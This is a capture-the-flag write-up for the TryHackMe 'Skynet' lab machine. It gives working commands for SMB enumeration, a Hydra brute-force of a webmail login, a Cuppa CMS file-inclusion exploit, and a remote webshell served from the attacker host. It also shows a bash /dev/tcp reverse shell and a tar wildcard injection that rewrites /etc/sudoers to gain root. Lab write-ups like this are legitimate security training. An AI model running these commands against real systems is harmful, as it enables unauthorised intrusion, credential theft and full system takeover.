# Skynet â€” TryHackMe Writeup

**Target:** `TARGET_IP` (10.130.137.2 at time of solve)
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.18, SquirrelMail, Samba 4.3.11, Cuppa CMS
**Exploit chain:** SMB anonymous â†’ user `milesdyson` + password list â†’ Hydra brute-force SquirrelMail â†’ email leaks new SMB password â†’ hidden CMS path in notes share â†’ Cuppa CMS LFI/RFI (CVE-2022-25486) â†’ RFI webshell â†’ `www-data` shell â†’ tar wildcard cron â†’ root

---

## Attack Chain Overview

```
nmap â†’ 22, 80, 110, 139, 143, 445
    â†’
enum4linux â†’ anonymous SMB share â†’ user milesdyson + log1.txt password list
    â†’
feroxbuster â†’ /squirrelmail
    â†’
Hydra brute-force â†’ milesdyson:cyborg007haloterminator
    â†’
SquirrelMail email â†’ new SMB password )s{A&2Z=F^n_E.B`
    â†’
smbclient milesdyson â†’ notes/important.txt â†’ /45kra24zxs28v3yd/
    â†’
Cuppa CMS LFI/RFI (alertConfigField.php?urlConfig=) â†’ RFI webshell â†’ www-data
    â†’
tar wildcard cron in /var/www/html â†’ checkpoint injection â†’ sudoers append â†’ root
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [SMB Anonymous Enumeration](#2-smb-anonymous-enumeration)
3. [SquirrelMail Brute Force](#3-squirrelmail-brute-force)
4. [SMB Pivot â€” New Credentials from Email](#4-smb-pivot--new-credentials-from-email)
5. [Initial Access â€” Cuppa CMS RFI](#5-initial-access--cuppa-cms-rfi)
6. [Privilege Escalation â€” Tar Wildcard Cron](#6-privilege-escalation--tar-wildcard-cron)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full TCP port scan with high performance.
# Why here: discover the attack surface including SMB, mail and web services.
nmap -sS --min-rate 5000 -Pn -n --open $TARGET -oN silent
nmap -sVC -p22,80,110,139,143,445 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 |
| 80/tcp | Apache 2.4.18 |
| 110/tcp | Dovecot POP3 |
| 139, 445/tcp | Samba 4.3.11 |
| 143/tcp | Dovecot IMAP |

See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. SMB Anonymous Enumeration

Full technique: [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md).

```bash
# What it does: enumerate SMB shares, users and groups via null session.
# Why here: discover the anonymous share and extract the username milesdyson plus the password list.
enum4linux $TARGET -r
# S-1-22-1-1001 Unix User\milesdyson (Local User)

# What it does: connect to the anonymous share and download all files.
# Why here: recover log files containing a password list for brute-force.
smbclient //$TARGET/anonymous
mget *
```

The anonymous share contained `attention.txt` (passwords were changed) and `log1.txt` (a password list).

---

## 3. SquirrelMail Brute Force

```bash
# What it does: brute-force directories on the web server.
# Why here: discover the /squirrelmail webmail login page.
feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -s 200
```

```bash
# What it does: brute-force SquirrelMail login with Hydra.
# Why here: authenticate as milesdyson using the recovered password list from the SMB share.
hydra -L users.txt -P log1.txt $TARGET http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Invalid" \
  -V -f -t 4
# [80][http-post-form] host: $TARGET   login: milesdyson   password: cyborg007haloterminator
```

Tools: [feroxbuster](../../../tools/fuzz/feroxbuster.md), [hydra](../../../tools/creds/hydra.md).

---

## 4. SMB Pivot â€” New Credentials from Email

Inside SquirrelMail, a system email disclosed a new SMB password. With the new password, milesdyson's personal share was accessible, and `important.txt` revealed a hidden web directory.

```
Password: )s{A&2Z=F^n_E.B`
```

```bash
# What it does: connect to milesdyson's personal SMB share.
# Why here: access private notes using the credentials recovered from the email.
smbclient //$TARGET/milesdyson -U milesdyson%)s{A\&2Z=F^n_E.B\`
# â†’ notes/important.txt â†’ reveals /45kra24zxs28v3yd/
```

---

## 5. Initial Access â€” Cuppa CMS RFI

Full technique: [cuppa-cms-rfi.md](../../../exploits/web-disclosure/cuppa-cms-alertconfig-lfi-rfi.md).

The hidden directory ran Cuppa CMS, vulnerable to remote/local file inclusion via the `urlConfig` parameter in `alertConfigField.php`.

```bash
# What it does: search for known exploits for Cuppa CMS.
# Why here: confirm the LFI/RFI vulnerability in alertConfigField.php.
searchsploit alertConfigField

# What it does: test local file inclusion via the urlConfig parameter.
# Why here: confirm the vulnerability reads arbitrary files from the server.
curl "http://$TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"

# What it does: exfiltrate the CMS configuration via a PHP filter wrapper.
# Why here: recover database credentials from Configuration.php.
curl "http://$TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php"
```

Pivot to RFI for RCE:
```bash
# What it does: host the webshell on the attacker machine.
# Why here: serve the PHP payload for the target to include remotely.
python3 -m http.server 80

# What it does: trigger remote file inclusion to execute a webshell.
# Why here: confirm command execution as www-data via the RFI primitive.
curl "http://$TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$LHOST/shell.php&cmd=whoami"
# www-data
```

Reverse shell:
```bash
# What it does: start a TCP listener on the attacker machine.
# Why here: receive the reverse shell connection from the target.
nc -lvnp 4444

# What it does: trigger the RFI with a bash reverse shell payload.
# Why here: establish an interactive foothold as www-data.
curl "http://$TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$LHOST/shell.php&cmd=bash -c 'bash -i >%26 /dev/tcp/$LHOST/4444 0>%261'"
```

Stabilise:
```bash
# What it does: spawn an interactive bash shell using Python.
# Why here: stabilize the raw netcat shell to allow for tab completion and job control.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

## 6. Privilege Escalation â€” Tar Wildcard Cron

Full technique: [tar-wildcard-injection.md](../../../privesc/linux/tar-wildcard-injection.md).

A root cron job ran `tar cf ... *` inside `/var/www/html`. The wildcard expansion allows injecting tar flags as filenames.

```bash
# What it does: display the backup script run by root.
# Why here: identify the wildcard expansion vulnerability in the tar command.
cat /home/milesdyson/backups/backup.sh
# #!/bin/bash
# cd /var/www/html
# tar cf /home/milesdyson/backups/backup.tgz *
```

```bash
# What it does: create a script that appends a NOPASSWD sudoers entry for www-data.
# Why here: prepare the privilege escalation payload to be triggered by tar's checkpoint feature.
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh

# What it does: create tar checkpoint-action and checkpoint trigger files.
# Why here: abuse the wildcard glob so tar interprets these filenames as command-line flags.
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1

# (wait for cron tick)

# What it does: verify the new sudoers entry was written.
# Why here: confirm privilege escalation succeeded before reading the root flag.
sudo -l
sudo cat /root/root.txt
```

---

## 7. Key Takeaways

- Anonymous SMB shares are not just for files â€” they leak usernames via RID cycling (`enum4linux -r`).
- Webmail (SquirrelMail, Roundcube) frequently stores new credentials in emails. Always read the inbox after brute-forcing.
- Cuppa CMS `alertConfigField.php?urlConfig=` is a textbook LFI â†’ RFI chain. The `urlConfig` parameter accepts both `file://` and `http://` schemes.
- `tar cf ... *` with attacker-writable directories is exploitable via `--checkpoint-action=exec=`. The filenames are expanded as tar flags.
- Password lists from SMB shares are first-class brute-force material â€” always check for credential files before running generic wordlists.

---

## Related Notes
- [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md) â€” initial enumeration
- [cuppa-cms-rfi.md](../../../exploits/web-disclosure/cuppa-cms-alertconfig-lfi-rfi.md) â€” initial access
- [tar-wildcard-injection.md](../../../privesc/linux/tar-wildcard-injection.md) â€” privilege escalation
- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) â€” playbook backbone
- [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [hydra](../../../tools/creds/hydra.md), [smbclient](../../../tools/recon/smbclient.md), [netcat](../../../tools/pivot/netcat.md)
